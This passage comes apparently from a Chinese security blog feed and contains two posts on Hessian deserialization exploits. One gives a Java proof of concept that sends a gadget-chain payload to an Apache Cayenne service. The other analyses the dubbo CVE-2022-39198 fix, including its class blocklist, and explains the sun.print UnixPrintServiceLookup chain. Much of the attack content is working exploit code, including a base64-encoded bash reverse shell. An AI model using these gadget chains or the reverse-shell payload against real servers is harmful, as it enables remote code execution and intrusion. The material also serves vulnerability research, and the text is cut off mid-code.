class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.apache.cayenne.tutorial.persistent;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.*;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.utils.FastStringBuffer;<br><span class="hljs-keyword">import</span> org.apache.cayenne.remote.ClientMessage;<br><span class="hljs-keyword">import</span> org.apache.cayenne.rop.HessianROPSerializationService;<br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><span class="hljs-keyword">import</span> sun.print.UnixPrintServiceLookup;<br><span class="hljs-keyword">import</span> sun.reflect.ReflectionFactory;<br><span class="hljs-keyword">import</span> sun.reflect.misc.MethodUtil;<br><span class="hljs-keyword">import</span> sun.swing.SwingLazyValue;<br><br><span class="hljs-keyword">import</span> javax.activation.MimeTypeParameterList;<br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.net.HttpURLConnection;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.TreeMap;<br><span class="hljs-keyword">import</span> java.util.TreeSet;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">exp</span> &#123;<br>     <span class="hljs-keyword">static</span> <span class="hljs-type">SerializerFactory</span> <span class="hljs-variable">serializerFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>();<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        serializerFactory.setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">UnixPrintServiceLookup</span> <span class="hljs-variable">lookup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnixPrintServiceLookup</span>();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;open -a calculator&quot;</span>;<br>        setFieldValue(lookup, <span class="hljs-string">&quot;osname&quot;</span>, <span class="hljs-string">&quot;xx&quot;</span>);<br>        setFieldValue(lookup,<span class="hljs-string">&quot;lpcFirstCom&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;cmd,cmd,cmd&#125;);<br>        setFieldValue(lookup, <span class="hljs-string">&quot;cmdIndex&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getPrintServices</span> <span class="hljs-operator">=</span> lookup.getClass().getMethod(<span class="hljs-string">&quot;getDefaultPrintService&quot;</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">invoke</span> <span class="hljs-operator">=</span> MethodUtil.class.getMethod(<span class="hljs-string">&quot;invoke&quot;</span>, Method.class, Object.class, Object[].class);<br>        Object[] ags = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;invoke, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123; getPrintServices,lookup,<span class="hljs-literal">null</span>&#125;&#125;;<br>        <span class="hljs-type">SwingLazyValue</span> <span class="hljs-variable">swingLazyValue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;sun.reflect.misc.MethodUtil&quot;</span>,<span class="hljs-string">&quot;invoke&quot;</span>,ags);<br><br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">u1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">u2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br><br><br>        u2.put(<span class="hljs-string">&quot;2&quot;</span>,swingLazyValue);<br>        u1.put(<span class="hljs-string">&quot;2&quot;</span>,swingLazyValue);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> maskmap(u1, u2);<br><br><br>        <span class="hljs-type">HessianROPSerializationService</span> <span class="hljs-variable">serializationService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianROPSerializationService</span>(serializerFactory);<br>        <span class="hljs-type">byte</span>[] serialize = serializationService.serialize(hashMap);<br>        post(serialize);<br><span class="hljs-comment">//        serializationService.deserialize(serialize, ClientMessage.class);</span><br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap <span class="hljs-title function_">maskmap</span><span class="hljs-params">(Object u1,Object u2)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> node.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, node);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">node1</span> <span class="hljs-operator">=</span> constructor.newInstance(<span class="hljs-number">0</span>, u1, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">node2</span> <span class="hljs-operator">=</span> constructor.newInstance(<span class="hljs-number">0</span>, u2, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> node.getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        key.setAccessible(<span class="hljs-literal">true</span>);<br>        key.set(node1, u1);<br>        key.set(node2, u2);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> HashMap.class.getDeclaredField(<span class="hljs-string">&quot;size&quot;</span>);<br>        size.setAccessible(<span class="hljs-literal">true</span>);<br>        size.set(hashMap, <span class="hljs-number">2</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">table</span> <span class="hljs-operator">=</span> HashMap.class.getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>);<br>        table.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">arr</span> <span class="hljs-operator">=</span> Array.newInstance(node, <span class="hljs-number">2</span>);<br>        Array.set(arr, <span class="hljs-number">0</span>, node1);<br>        Array.set(arr, <span class="hljs-number">1</span>, node2);<br>        table.set(hashMap, arr);<br><br>        <span class="hljs-keyword">return</span> hashMap;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">post</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] b)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><span class="hljs-comment">//        Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(&quot;127.0.0.1&quot;, 8088));</span><br>        URL url=<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://127.0.0.1:8080/cayenne-service&quot;</span>);<br>        <span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">con</span> <span class="hljs-operator">=</span> (HttpURLConnection) url.openConnection();<br>        con.setRequestProperty(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/hessian&quot;</span>);<br>        con.setRequestProperty(<span class="hljs-string">&quot;Authorization&quot;</span>, <span class="hljs-string">&quot;Basic Y2F5ZW5uZS11c2VyOnNlY3JldA==&quot;</span>);<br>        con.setRequestMethod(<span class="hljs-string">&quot;POST&quot;</span>);<br>        con.setDoOutput(<span class="hljs-literal">true</span>);<br>        con.setDoInput(<span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">try</span>(<span class="hljs-type">OutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> con.getOutputStream()) &#123;<br>            os.write(b);<br>        &#125;<br>        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(con.getInputStream()));<br>        String line;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-keyword">while</span> ((line = reader.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>            response.append(line);<br>        &#125;<br>        reader.close();<br><br>        <span class="hljs-comment">// 打印响应内容</span><br>        System.out.println(<span class="hljs-string">&quot;Response Body: &quot;</span> + response.toString());<br><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p><a href="https://lists.apache.org/thread/zthjy83t3o66x7xcbygn2vg3yjvlc9vc">https://lists.apache.org/thread/zthjy83t3o66x7xcbygn2vg3yjvlc9vc</a></p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>此文章 仅用于教育目的。请负责任地使用它，并且仅在您有明确测试权限的系统上使用。滥用此 PoC 可能会导致严重后果。</p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hessian反序列_Print—gadget</title>
    <link href="/2024/02/28/hessian%E5%8F%8D%E5%BA%8F%E5%88%97-Print%E2%80%94gadget/"/>
    <url>/2024/02/28/hessian%E5%8F%8D%E5%BA%8F%E5%88%97-Print%E2%80%94gadget/</url>
    
    <content type="html"><![CDATA[<h3 id="0x01-dubbo-CVE-2022-39198"><a href="#0x01-dubbo-CVE-2022-39198" class="headerlink" title="0x01 dubbo CVE-2022-39198"></a>0x01 dubbo CVE-2022-39198</h3><p>2.7.x &lt; version &lt; 2.7.18</p><p>3.0.x &lt; version &lt; 3.0.12</p><p>3.1.x &lt; version &lt;&#x3D; 3.1.0</p><p>我们看看github的diff</p><p><a href="https://github.com/apache/dubbo-hessian-lite/commit/5727b36a3cdc428baeef7ee03b131905e39be8ad">https://github.com/apache/dubbo-hessian-lite/commit/5727b36a3cdc428baeef7ee03b131905e39be8ad</a></p><p>主要的更改是在<code>resources/DENY_CLASS</code>文件中</p><p>这个文件中，是这个项目维护的一个黑名单</p><p>从这次的修复中，多新增了好几个黑名单包名</p><p><img src="image-20240229001709293.png" alt="image-20240229001709293"></p><blockquote><p>org.apache.commons.codec.</p><p>org.aspectj.</p><p>org.dom4j</p><p>org.junit.</p><p>org.mockito.</p><p>org.thymeleaf.</p><p>ognl.</p><p>sun.print.</p></blockquote><p>有很多，但是在其中只是存在有一个存在于JDK中的包名，即为<code>sun.print.</code>，这里仅是主要探讨有关于JDK中的利用链进行学习</p><p>如果曾经更进过hessian以前的其他链子，你会发现，大多数的链子都是通过使用<code>HashMap / HashSet / HashTable</code>等类来触发<code>equals/hashcode / compareTo</code>等等方法来进行接下来的调用</p><p>而其中，marshal项目中存在有多个通过调用<code>XString#equals</code>方法的方式</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20221216231300-210f8ade-7d54-1.png"><img src="image-20240229001852359.png" alt="image-20240229001852359"></a></p><p>进而调用到其他类的<code>toString</code>方法进行接下来 的调用</p><h3 id="0x02-sun-print-分析"><a href="#0x02-sun-print-分析" class="headerlink" title="0x02 sun.print 分析"></a>0x02 sun.print 分析</h3><p>调用栈</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java">run:<span class="hljs-number">897</span>, UnixPrintServiceLookup$<span class="hljs-number">1</span> (sun.print)<br>doPrivileged:-<span class="hljs-number">1</span>, AccessController (java.security)<br>execCmd:<span class="hljs-number">888</span>, UnixPrintServiceLookup (sun.print)<br>getDefaultPrinterNameBSD:<span class="hljs-number">750</span>, UnixPrintServiceLookup (sun.print)<br>getDefaultPrintService:<span class="hljs-number">663</span>, UnixPrintServiceLookup (sun.print)<br>refreshServices:<span class="hljs-number">277</span>, UnixPrintServiceLookup (sun.print)<br>getPrintServices:<span class="hljs-number">233</span>, UnixPrintServiceLookup (sun.print)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">497</span>, Method (java.lang.reflect)<br>toString:<span class="hljs-number">158</span>, ToStringBean (com.rometools.rome.feed.impl)<br>toString:<span class="hljs-number">129</span>, ToStringBean (com.rometools.rome.feed.impl)<br>beanHashCode:<span class="hljs-number">198</span>, EqualsBean (com.rometools.rome.feed.impl)<br>hashCode:<span class="hljs-number">180</span>, EqualsBean (com.rometools.rome.feed.impl)<br>hash:<span class="hljs-number">338</span>, HashMap (java.util)<br>put:<span class="hljs-number">611</span>, HashMap (java.util)<br>readMap:<span class="hljs-number">114</span>, MapDeserializer (com.caucho.hessian.io)<br>readMap:<span class="hljs-number">577</span>, SerializerFactory (com.caucho.hessian.io)<br>readObject:<span class="hljs-number">2093</span>, Hessian2Input (com.caucho.hessian.io)<br>main:<span class="hljs-number">99</span>, hessian_tostring (com.ser)<br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">sun</span>.<span class="hljs-keyword">print</span>.UnixPrintServiceLookup<br></code></pre></td></tr></table></figure><p><img src="image-20240229002034259.png" alt="image-20240229002034259"></p><p>有public 无参构造方法</p><p><img src="image-20240229002244293.png" alt="image-20240229002244293"></p><p>这个类中存在众多properties.这条连主要就是由PrintServices这个触发，PrintServices会掉哟过defPrintServices，所以一个样。</p><p><img src="image-20240229002459732.png" alt="image-20240229002459732"></p><p><img src="image-20240229002512520.png" alt="image-20240229002512520"></p><p>也就是说会触发多次。</p><p>sun.print.UnixPrintServiceLookup#getDefaultPrintService()</p><p><img src="image-20240229002732411.png" alt="image-20240229002732411"></p><p>要出发命令，需要走到getDefaultPrinterNameBSD()这个方法</p><p><img src="image-20240229002900212.png" alt="image-20240229002900212"></p><p><img src="image-20240229002838686.png" alt="image-20240229002838686"></p><p><img src="image-20240229002950452.png" alt="image-20240229002950452"></p><p>首先会判断CUPS server是否开启，然后判断是不是系统是不是mac或者sun。osname是属性，可以直接利用反射修改。</p><p>CUPS server可以使用关闭</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo systemctl mask cups<br>reboot<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># mac</span></span><br>sudo launchctl stop org.cups.cupsd<br>sudo launchctl disable system/org.cups.cupsd<br></code></pre></td></tr></table></figure><p>sun.print.UnixPrintServiceLookup#getDefaultPrinterNameBSD()</p><p><img src="image-20240229003213401-9137933.png" alt="image-20240229003213401"></p><p>可以看到这里的判断。直接反射修改就好了</p><p><img src="image-20240229003306236.png" alt="image-20240229003306236"></p><p>需要注意lpcFirstCom是一个数组。</p><p>sun.print.UnixPrintServiceLookup#execCmd()</p><p><img src="image-20240229003415540.png" alt="image-20240229003415540"></p><p>调用后判断一下系统，然后赋值var2数组，最后exec。</p><p>总结需要一个触发getter的类，去触发getDefaultPrinter()。其中要满足cpus服务为false，其余都可以使用反射修改。可以想到rome，fastjson，jackson等去调用getter</p><h3 id="0x03-poc"><a href="#0x03-poc" class="headerlink" title="0x03 poc"></a>0x03 poc</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java">run:<span class="hljs-number">897</span>, UnixPrintServiceLookup$<span class="hljs-number">1</span> (sun.print)<br>doPrivileged:-<span class="hljs-number">1</span>, AccessController (java.security)<br>execCmd:<span class="hljs-number">888</span>, UnixPrintServiceLookup (sun.print)<br>getDefaultPrinterNameBSD:<span class="hljs-number">750</span>, UnixPrintServiceLookup (sun.print)<br>getDefaultPrintService:<span class="hljs-number">663</span>, UnixPrintServiceLookup (sun.print)<br>refreshServices:<span class="hljs-number">277</span>, UnixPrintServiceLookup (sun.print)<br>getPrintServices:<span class="hljs-number">233</span>, UnixPrintServiceLookup (sun.print)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">497</span>, Method (java.lang.reflect)<br>toString:<span class="hljs-number">158</span>, ToStringBean (com.rometools.rome.feed.impl)<br>toString:<span class="hljs-number">129</span>, ToStringBean (com.rometools.rome.feed.impl)<br>beanHashCode:<span class="hljs-number">198</span>, EqualsBean (com.rometools.rome.feed.impl)<br>hashCode:<span class="hljs-number">180</span>, EqualsBean (com.rometools.rome.feed.impl)<br>hash:<span class="hljs-number">338</span>, HashMap (java.util)<br>put:<span class="hljs-number">611</span>, HashMap (java.util)<br>readMap:<span class="hljs-number">114</span>, MapDeserializer (com.caucho.hessian.io)<br>readMap:<span class="hljs-number">577</span>, SerializerFactory (com.caucho.hessian.io)<br>readObject:<span class="hljs-number">2093</span>, Hessian2Input (com.caucho.hessian.io)<br>main:<span class="hljs-number">99</span>, hessian_tostring (com.ser)<br></code></pre></td></tr></table></figure><p>以rome为列</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ser;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.SerializerFactory;<br><span class="hljs-keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javafx.beans.property.Property;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><span class="hljs-keyword">import</span> sun.print.CUPSPrinter;<br><span class="hljs-keyword">import</span> sun.print.UnixPrintServiceLookup;<br><span class="hljs-keyword">import</span> sun.swing.SwingLazyValue;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Array;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.security.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">hessian_tostring</span> &#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">SerializerFactory</span> <span class="hljs-variable">serializerFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>();<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        serializerFactory.setAllowNonSerializable(<span class="hljs-literal">true</span>);<br><br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">theUnsafe</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        theUnsafe.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> (Unsafe) theUnsafe.get(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">lookup</span> <span class="hljs-operator">=</span> unsafe.allocateInstance(UnixPrintServiceLookup.class);<br>      <span class="hljs-comment">// 因为是数组形式exec，所以使用;来截断，在执行后面。</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;;sh -c &#x27;&#123;echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEyNy4wLjAuMS85OTk5IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;sh,-i&#125;&#x27;&quot;</span>;<br><span class="hljs-comment">//        String cmd = &quot;open .&quot;;</span><br>        setFieldValue(lookup, <span class="hljs-string">&quot;osname&quot;</span>, <span class="hljs-string">&quot;xx&quot;</span>);<br>        setFieldValue(lookup,<span class="hljs-string">&quot;lpcFirstCom&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;cmd,cmd,cmd&#125;);<br>        setFieldValue(lookup, <span class="hljs-string">&quot;cmdIndex&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-type">EqualsBean</span> <span class="hljs-variable">equalsBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EqualsBean</span>(ToStringBean.class,<span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(lookup.getClass(),lookup));<br><br><span class="hljs-comment">//防止序列化的时候执行</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> maskmap(equalsBean, equalsBean);<br><br><br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./hessiantwo&quot;</span>));<br>        hessian2Output.setSerializerFactory(serializerFactory);<br>        hessian2Output.writeObject(hashMap);<br>        hessian2Output.flushBuffer();<br><br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./hessiantwo&quot;</span>));<br>        hessian2Input.readObject();<br><br><span class="hljs-comment">//        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="hljs-comment">//        ObjectOutputStream outputStream = new ObjectOutputStream(baos);</span><br><span class="hljs-comment">//        outputStream.writeObject(hashMap);</span><br><span class="hljs-comment">//        outputStream.close();</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());</span><br><span class="hljs-comment">//        ObjectInputStream Input = new ObjectInputStream(bais);</span><br><span class="hljs-comment">//        Input.readObject();</span><br><span class="hljs-comment">//        ObjectOutputStream outputStream = new 